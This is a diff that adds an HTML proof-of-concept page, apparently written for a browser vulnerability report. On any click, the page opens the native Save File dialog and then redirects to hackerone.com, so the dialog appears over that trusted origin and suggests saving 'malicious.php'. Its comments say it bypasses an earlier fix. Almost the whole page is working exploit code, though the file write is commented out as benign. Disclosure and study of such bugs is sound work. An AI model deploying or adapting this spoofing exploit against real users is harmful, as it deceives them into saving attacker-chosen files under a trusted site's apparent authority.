@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Save Picker</title>
+  <style>
+    body { margin:0; height:100vh; display:flex; justify-content:center; align-items:center;
+           font-family:sans-serif; background:#fafafa; cursor:pointer; user-select:none; }
+    h1 { color:#333; text-align:center; max-width:420px; padding:20px; }
+  </style>
+</head>
+<body>
+  <h1>Click me anywhere.<br>You will be taken to the trusted site to save your file.</h1>
+
+  <script>
+    // Bypass of the delayed-picker fix (issue 419721056).
+    // The fix suppresses showSaveFilePicker() when it is CALLED while the page
+    // is inactive. Here the picker is CALLED while the page is still active
+    // (on the click), and the redirect happens right after. The native Save
+    // dialog renders a few seconds later — by which time the tab already shows
+    // the trusted origin — so the dialog is presented OVER the trusted site.
+
+    const TRUSTED_URL = 'https://hackerone.com';   // origin to spoof
+    const REDIRECT_AFTER_MS = 300;                  // navigate shortly after the call
+
+    document.addEventListener('click', () => {
+      if (!('showSaveFilePicker' in window)) { alert('showSaveFilePicker unsupported'); return; }
+
+      // 1) Invoke the picker WHILE THE PAGE IS ACTIVE (this is what evades the fix).
+      window.showSaveFilePicker({
+        suggestedName: 'malicious.php',
+        types: [{ description: 'Text Files', accept: { 'text/plain': ['.php'] } }]
+      }).then(async (handle) => {
+        // A real attacker would write here; kept benign for the PoC.
+        // const w = await handle.createWritable(); await w.write('...'); await w.close();
+        console.log('handle:', handle && handle.name);
+      }).catch(() => { /* user cancelled */ });
+
+      // 2) Redirect to the trusted site. The dialog paints a few seconds later,
+      //    over this trusted origin.
+      setTimeout(() => { window.location.href = TRUSTED_URL; }, REDIRECT_AFTER_MS);
+    }, { once: true });
+  </script>
+</body>
+</html>
